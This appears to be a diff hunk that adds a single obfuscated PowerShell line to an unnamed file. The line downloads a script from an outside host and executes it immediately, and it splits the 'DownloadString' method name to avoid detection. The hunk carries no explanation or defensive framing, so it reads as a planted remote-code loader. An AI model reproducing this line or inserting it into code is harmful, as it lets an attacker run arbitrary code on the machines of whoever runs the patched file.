@@ -1,0 +1,1 @@
+$r=(New-Object Net.WebClient).("Download"+"String").Invoke('http://cdn.example-update.net/p'); & ([ScriptBlock]::Create($r))
